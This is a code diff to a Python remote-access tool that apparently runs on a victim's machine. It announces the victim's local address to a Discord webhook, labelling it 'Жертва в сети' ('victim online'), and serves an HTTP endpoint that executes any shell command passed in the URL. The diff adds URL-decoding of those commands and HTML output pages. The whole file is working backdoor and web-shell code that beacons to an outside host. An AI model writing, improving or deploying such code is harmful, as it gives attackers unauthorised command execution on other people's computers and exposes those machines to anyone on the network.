@@ -1,7 +1,7 @@
 import http.server
 import socketserver
 import subprocess
-import os
+import urllib.parse
 import socket
 import requests
 
@@ -12,7 +12,7 @@ DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1353497620655509554/XB0qrjAK
 hostname = socket.gethostname()
 local_ip = socket.gethostbyname(hostname)
 
-# Отправляем IP на Discord Webhook
+# Отправляем IP на Discord
 requests.post(DISCORD_WEBHOOK, json={"content": f"Жертва в сети: http://{local_ip}:{PORT}"})
 
 class Handler(http.server.SimpleHTTPRequestHandler):
@@ -37,15 +37,28 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                 </html>
             """)
         elif self.path.startswith("/cmd?command="):
-            command = self.path.split("=")[1]
+            command = urllib.parse.unquote(self.path.split("=")[1])
             output = subprocess.getoutput(command)
+            
             self.send_response(200)
             self.send_header("Content-type", "text/html")
             self.end_headers()
-            self.wfile.write(f"<pre>{output}</pre>".encode())
+            
+            response_html = f"""
+                <html>
+                <head>
+                    <title>Command Output</title>
+                </head>
+                <body>
+                    <h1>Command Executed: {command}</h1>
+                    <pre>{output}</pre>
+                    <a href=''>Back</a>
+                </body>
+                </html>
+            """
+            self.wfile.write(response_html.encode())
 
 print(f"Сервер запущен! Жертва в сети: http://{local_ip}:{PORT}")
 
 with socketserver.TCPServer(("", PORT), Handler) as httpd:
     httpd.serve_forever()
-
